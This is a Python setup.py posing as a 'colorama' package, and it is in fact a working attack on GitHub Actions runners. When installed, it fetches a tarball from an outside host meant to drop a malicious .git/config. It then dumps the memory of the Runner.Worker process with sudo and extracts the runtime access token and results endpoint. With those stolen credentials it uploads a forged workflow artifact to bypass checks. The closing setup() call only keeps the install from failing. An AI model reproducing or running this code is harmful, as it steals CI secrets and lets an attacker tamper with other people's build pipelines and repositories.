import os
import json

# Drop malicious .git/config through .tar.gz
os.system("mkdir -p .artifact; cd .artifact; wget https://worty.fr/repository_state.tar.gz")
print(os.popen("pwd").read())
print(os.popen("ls -lah .artifact").read())

os.makedirs("/tmp/depi/",exist_ok=True)
os.chdir("/tmp/depi/")

# Dump env vars
DUMP_MEM_SCRIPT="""
import os
import re 
import sys

def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid

    raise Exception('Can not get pid of Runner.Worker')

pid = get_pid()
map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"
fd_data = open("/tmp/depi/data","wb")

with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
    for line in map_f.readlines():
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
        if m.group(3) == 'r':
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            if start > sys.maxsize:
                continue
            mem_f.seek(start)
        
            try:
                chunk = mem_f.read(end - start)
                fd_data.write(chunk)
            except OSError:
                continue
fd_data.close()
"""

with open("/tmp/depi/dump.py", "w") as fd_f:
    fd_f.write(DUMP_MEM_SCRIPT)

os.system("sudo python3 dump.py")
results_endpoint = os.popen("cat data | tr -d '\\0' | grep -aoE 'system.github.results_endpoint\":\\{\"value\":[^}]*\\}' | sort -u | cut -d'\"' -f5").read().strip()
access_token = os.popen("cat data | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"AccessToken\":\"[^\"]*\"\\}' | sort -u | grep -Eo 'eyJ.*' | cut -d'\"' -f1").read().strip()


# Upload malicious strands-parsed-input to bypass checks
JSON_CONTENT={
    "branch_name":"depi",
    "issue_id":"1",
    "head_repo":"",
    "mode":"implementer"
}

with open("/tmp/depi/strands-parsed-input.json","w") as fd_f:
    fd_f.write(json.dumps(JSON_CONTENT))

JS_UPLOAD="""
import { DefaultArtifactClient } from '@actions/artifact';
const client = new DefaultArtifactClient();
const { id, size } = await client.uploadArtifact(
    'strands-parsed-input',
    ['strands-parsed-input.json'],
    '.'
);
"""

with open("/tmp/depi/index.js", "w") as fd_f:
    fd_f.write(JS_UPLOAD)

os.system(f"npm install @actions/artifact@2; ACTIONS_RESULTS_URL={results_endpoint} ACTIONS_RUNTIME_TOKEN={access_token} node index.js;")

# Required output for script not to crash
from setuptools import setup, find_packages

setup(
    name="colorama",
    version="0.1.0",
    packages=find_packages(),
    python_requires=">=3.9",
    install_requires=[
        "requests>=2.31,<3",
    ],
)
